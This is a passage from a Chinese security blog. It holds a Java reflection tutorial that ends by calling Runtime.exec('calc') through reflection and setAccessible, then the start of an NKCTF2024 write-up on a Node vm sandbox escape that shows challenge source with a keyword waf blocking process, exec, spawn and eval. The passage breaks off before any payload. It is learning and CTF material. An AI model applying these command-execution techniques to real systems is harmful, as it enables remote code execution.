gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> ReflectDemo &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 类的.class属性</span></span><br><span class="line">        <span class="keyword">Class</span> c1 = ReflectDemo.<span class="keyword">class</span>;</span><br><span class="line">        System.out.<span class="keyword">println</span>(c1);</span><br><span class="line">        <span class="comment">//class ReflectDemo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化对象的getClass()方法</span></span><br><span class="line">        ReflectDemo demo = <span class="keyword">new</span> ReflectDemo();</span><br><span class="line">        <span class="keyword">Class</span> c2 = demo.getClass();</span><br><span class="line">        System.out.<span class="keyword">println</span>(c2);</span><br><span class="line">        <span class="comment">//class ReflectDemo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Class.forName(String className): 动态加载类</span></span><br><span class="line">        <span class="keyword">Class</span> c3 = <span class="keyword">Class</span>.forName(<span class="string">&quot;ReflectDemo&quot;</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(c3);</span><br><span class="line">        <span class="comment">//class ReflectDemo</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p><p>而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误；</p><p>而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。所以我们在获取class对象中，一般使用Class.forName方法去获取。</p><h2 id="Class-的常用方法"><a href="#Class-的常用方法" class="headerlink" title="Class 的常用方法"></a>Class 的常用方法</h2><p>获取到了class类后，我们的目的是调用class对象中的方法，以下是常用的class内部方法</p><p>getFields()</p><blockquote><p>返回公共属性，也就是public属性</p></blockquote><p>getDeclaredFields()</p><blockquote><p>返回所有属性</p></blockquote><p>getField(String name)</p><blockquote><p>返回一个指定公共属性名的Field对象。</p></blockquote><p>getMethods()</p><blockquote><p>返回公共方法，也就是public方法</p></blockquote><p>getDeclaredMethods()</p><blockquote><p>返回所有方法</p></blockquote><p>getConstructors()</p><blockquote><p>返回公共构造方法，也就是public构造方法</p></blockquote><p>getConstructor(Class[] args)</p><blockquote><p>返回一个指定参数列表的Constructor对象。</p></blockquote><p>getSuperclass()</p><blockquote><p>返回调用类的父类</p></blockquote><p>newInstance()</p><blockquote><p>使用无参构造方法创建该类的一个新实例。</p></blockquote><p>String getName()</p><blockquote><p>以String的形式返回该类（类、接口、数组类、基本类型或void）的完整名。</p></blockquote><p>更多方法见文章<a href="https://blog.csdn.net/u011531613/article/details/63681578">Java中Class类详解、用法以及泛化</a></p><h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><p>获取成员变量Field位于java.lang.reflect.Field包中</p><p>Field[] getFields() ：获取所有public修饰的成员变量</p><p>Field[] getDeclaredFields()  ：获取所有的成员变量，不考虑修饰符</p><p>Field getField(String name)  ：获取指定名称的 public修饰的成员变量</p><p>Field getDeclaredField(String name)  ：获取指定的成员变量</p><p><code>FieldTest.java</code>文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> FieldTest &#123;</span><br><span class="line">    <span class="built_in">public</span> String <span class="type">name</span>;</span><br><span class="line">    <span class="built_in">public</span> String profession;</span><br><span class="line">    protected <span class="type">int</span> age;</span><br><span class="line">    private String number;</span><br><span class="line">    <span class="type">char</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">Class</span> c1 = <span class="keyword">Class</span>.forName(&quot;FieldTest&quot;); // 创建<span class="keyword">Class</span>对象</span><br><span class="line"></span><br><span class="line">            Field[] fieldArray1 = c1.getDeclaredFields(); //获取全部成员变量</span><br><span class="line">            Field[] fieldArray2 = c1.getFields();// 获取全部<span class="built_in">public</span>成员变量</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Field field : fieldArray1)&#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(field);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Field field : fieldArray2)&#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(field);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            Field fieldArray3 = c1.getField(&quot;name&quot;); // 获取指定名称的<span class="built_in">public</span>修饰的成员变量</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(fieldArray3);</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            Field fieldArray4 = c1.getDeclaredField(&quot;number&quot;); // 获取指定的成员变量</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(fieldArray4);</span><br><span class="line">        &#125; catch (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc0743297a.png" alt="image-20240425163113648.png"></p><h2 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h2><p>Method getMethod(String name, 类&lt;?&gt;… parameterTypes)  &#x2F;&#x2F;返回该类所声明的public方法</p><p>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) &#x2F;&#x2F;返回该类所声明的所有方法</p><p>&#x2F;&#x2F;第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</p><p>Method[] getMethods()  &#x2F;&#x2F;获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</p><p>Method[] getDeclaredMethods()  &#x2F;&#x2F; 获取该类中的所有方法</p><p><code>MethodTest.java</code>文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.<span class="keyword">Method</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> MethodTest &#123;</span><br><span class="line">    <span class="built_in">public</span> <span class="type">void</span> study(String s) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;学习中...&quot; + s);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    protected <span class="type">void</span> run() &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;跑步中...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span> eat() &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;吃饭中...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private String sleep(<span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;睡眠中...&quot; + age);</span><br><span class="line">        <span class="keyword">return</span> &quot;sleep&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            <span class="keyword">Class</span> c = <span class="keyword">Class</span>.forName(&quot;MethodTest&quot;); // 创建<span class="keyword">Class</span>对象</span><br><span class="line">            <span class="keyword">Method</span>[] methods1 = c.getDeclaredMethods(); // 获取所有该类中的所有方法</span><br><span class="line">            <span class="keyword">Method</span>[] methods2 = c.getMethods(); // 获取所有的<span class="built_in">public</span>方法，包括类自身声明的<span class="built_in">public</span>方法，父类中的<span class="built_in">public</span>方法、实现的接口方法</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">Method</span> m:methods1) &#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(m);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">Method</span> m:methods2) &#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(m);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">Method</span> methods3 = c.getMethod(&quot;study&quot;, String.<span class="keyword">class</span>); // 获取study方法，String.<span class="keyword">class</span>是该方法参数的类型</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(methods3);</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">Method</span> method4 = c.getDeclaredMethod(&quot;sleep&quot;, <span class="type">int</span>.<span class="keyword">class</span>); // 获取sleep方法，<span class="type">int</span>.<span class="keyword">class</span>是该方法参数的类型</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(method4);</span><br><span class="line"></span><br><span class="line">        &#125; catch (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc07481ae3.png" alt="image-20240425171101979.png"></p><h2 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h2><p>Constructor&lt;?&gt;[] getConstructors()  ：只返回public构造函数</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</p><p>Constructor&lt;&gt; getConstructor(类&lt;?&gt;… parameterTypes)  : 匹配和参数配型相符的public构造函数</p><p>Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;… parameterTypes)  ： 匹配和参数配型相符的构造函数</p><p><code>Constructor.java</code>文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> ConstructorTest &#123;</span><br><span class="line">    <span class="built_in">public</span> ConstructorTest() &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;无参构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> ConstructorTest(String <span class="type">name</span>) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;有参构造函数&quot; + <span class="type">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    private ConstructorTest(<span class="type">boolean</span> n) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;私有构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            <span class="keyword">Class</span> c1 = <span class="keyword">Class</span>.forName(&quot;ConstructorTest&quot;);</span><br><span class="line">            Constructor[] constructors1  = c1.getDeclaredConstructors();</span><br><span class="line">            Constructor[] constructors2 = c1.getConstructors();</span><br><span class="line">            <span class="keyword">for</span> (Constructor c : constructors1) &#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line">            <span class="keyword">for</span> (Constructor c : constructors2) &#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line">            Constructor constructors3 = c1.getConstructor(String.<span class="keyword">class</span>);</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(constructors3);</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;-------分割线---------&quot;);</span><br><span class="line">            Constructor constructors4 = c1.getDeclaredConstructor(<span class="type">boolean</span>.<span class="keyword">class</span>);</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(constructors4);</span><br><span class="line">        &#125; catch (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc07471015.png" alt="image-20240425171743664.png"></p><h2 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h2><p>在前面我们获取了Class对象，之后展示了一系列获取成员变量、成员方法和成员函数的方式后，我们现在可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象。</p><p>使用的方式也特别简单，只需要通过forname方法获取到的class对象中进行newInstance方法创建即可。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Class</span> <span class="variable">c</span> <span class="operator">=</span> <span class="title class_">Class</span>.<span class="property">forName</span>(<span class="string">&quot;com.reflect.MethodTest&quot;</span>); <span class="comment">// 创建Class对象</span></span><br><span class="line">            <span class="title class_">Object</span> <span class="variable">m1</span> <span class="operator">=</span>  <span class="variable">c</span>.<span class="property">newInstance</span>(); <span class="comment">// 创建类对象</span></span><br></pre></td></tr></table></figure><p>invoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法，一般会和getMethod方法配合进行调用。使用用法</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> invoke(<span class="keyword">Object</span> obj, <span class="keyword">Object</span>... args)</span><br></pre></td></tr></table></figure><p>第一个参数为类的实例，第二个参数为相应函数中的参数</p><p>obj：从中调用底层方法的对象，必须是实例化对象</p><p>args： 用于方法的调用，是一个object的数组，参数有可能是多个</p><p>但需要注意的是，invoke方法第一个参数并不是固定的：</p><p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p><p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p><p>例子：</p><p><code>ReflectTest.java</code>文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reflectMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反射测试成功!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;ReflectTest&quot;</span>); <span class="comment">// 创建Class对象</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance(); <span class="comment">// 创建类实例对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;reflectMethod&quot;</span>); <span class="comment">// 获取reflectMethod方法</span></span><br><span class="line">            method.invoke(m); <span class="comment">// 调用类实例对象方法</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc07483bb0.png" alt="image-20240425173950684.png"></p><h2 id="利用反射构造Runtime类执行"><a href="#利用反射构造Runtime类执行" class="headerlink" title="利用反射构造Runtime类执行"></a>利用反射构造Runtime类执行</h2><p>java.lang.Runtime有一个<strong>exec</strong>方法可以<strong>执行本地命令</strong>，先不用反射，弹个计算机看看</p><p>如Runtime.exec方法有6个重载：</p><p><img src="https://img.picui.cn/free/2024/06/03/665dc0746af83.png" alt="image-20240425175929705.png"></p><p>就用最简单的<code>exec(String commmand)</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">String</span>[] args)</span> throws Exception </span>&#123;</span><br><span class="line">        Runtime.<span class="built_in">getRuntime</span>().<span class="built_in">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/03/665dc0749032f.png" alt="image-20240425175729069.png"></p><p>如果通过反射来执行命令，则还需引入一个方法：setAccessible(true)。因为反射机制也是有限制的，并不能饶过private权限的检查。</p><h2 id="设置setAccessible-true-暴力访问权限"><a href="#设置setAccessible-true-暴力访问权限" class="headerlink" title="设置setAccessible(true)暴力访问权限"></a>设置setAccessible(true)暴力访问权限</h2><p>在一般情况下，我们使用反射机制不能对类的私有private字段进行操作，绕过私有权限的访问。但一些特殊场景存在例外的时候，比如我们进行序列化操作的时候，需要去访问这些受限的私有字段，这时我们可以通过调用AccessibleObject上的setAccessible()方法来允许访问。</p><p>setAccessible(true) 是 Java  中的一个方法，它用于修改 Field、Method 或 Constructor  对象的访问权限，使得私有成员可以被访问和调用。在反射中，如果要访问一个私有成员，通常需要先将该成员的 setAccessible 设置为 <strong>true</strong>，然后才能调用它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取类名</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">consRuntime</span> <span class="operator">=</span> c1.getDeclaredConstructor();<span class="comment">//获取构造方法</span></span><br><span class="line">        consRuntime.setAccessible(<span class="literal">true</span>);<span class="comment">//设置属性为true，提供访问权限</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">newRuntime</span> <span class="operator">=</span> consRuntime.newInstance();<span class="comment">//实例化对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获取exec方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process)exec.invoke(newRuntime,<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我这是java9，这个版本貌似引进了个模块系统，这样弹不了计算机，但ljl的java8就行，还有几个rce的方法，算了明天再学</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YtQh4GQ+3YQ+4D&alichlgref=https://www.yuque.com/#toc-12">JAVA安全基础（二）– 反射机制</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024-web复现</title>
      <link href="/2024/06/01/NKCTF2024-web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/01/NKCTF2024-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="NKCTF2024复现"><a href="#NKCTF2024复现" class="headerlink" title="NKCTF2024复现"></a>NKCTF2024复现</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>好久之前写的了</p><h2 id="全世界最简单的CTF（vm2沙箱逃逸）"><a href="#全世界最简单的CTF（vm2沙箱逃逸）" class="headerlink" title="全世界最简单的CTF（vm2沙箱逃逸）"></a>全世界最简单的CTF（vm2沙箱逃逸）</h2><p>访问<code>/secret</code>路由得到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"> </span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> 